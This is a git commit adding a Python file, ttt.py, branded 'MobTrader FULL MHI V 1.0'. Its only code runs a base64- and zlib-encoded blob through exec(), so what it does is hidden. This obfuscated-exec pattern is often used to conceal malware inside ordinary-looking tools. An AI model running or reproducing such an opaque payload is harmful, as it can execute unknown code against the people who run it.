22ea3ca176bb41403ca2674796e06c9be2ca6680
mobdevkyel <79609322+mobdevkyel@users.noreply.github.com>
2021-07-14 01:26:12 -0300

    Add files via upload

---
+++ ttt.py
@@ -0,0 +1,11 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#______  ___       ______  ________                _________#             
+#___   |/  /______ ___  /_ ___  __/______________ _______  /_____ ________#
+#__  /|_/ / _  __ \__  __ \__  /   __  ___/_  __ `/_  __  / _  _ \__  ___/#
+#_  /  / /  / /_/ /_  /_/ /_  /    _  /    / /_/ / / /_/ /  /  __/_  /# 
+#/_/  /_/   \____/ /_.___/ /_/     /_/     \__,_/  \__,_/   \___/ /_/# 
+#FULL MHI V 1.0 - Contato: +55 (11) 9 7615-9233#
+
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eNplj70KgzAQgPdA3uEQggoqUtpFcO/SqVMnCcTUgDESTzqI797T1lba7X6+++5Oe2dBSazR2BqM7Z3HT56sUQJLrOoWJWecSRyhhPCQF6dTyFlDycZnnXtEMWfKSKo22YBeL/UoFCoVNhW3cOm+6cp0FRGmuxOsg4mmZphIPxd5Huw47byVSFCwaQDEuRCXQlyJ8/Uwtrg/g6z9uvd/VQI/2hjS739R40Y/lMd4ebQnHqOXPX4CNvtgrw==')))
